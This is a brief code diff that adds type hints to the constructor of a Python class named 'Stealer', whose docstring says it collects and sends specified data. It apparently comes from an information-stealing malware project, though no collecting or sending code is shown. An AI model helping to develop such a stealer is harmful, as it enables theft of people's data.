@@ -16,7 +16,7 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self, senders=None, features=None, utils=None):
+    def __init__(self, senders: list = None, features: list = None, utils: list = None):
         Thread.__init__(self, name="Stealer")
 
         if utils is None:
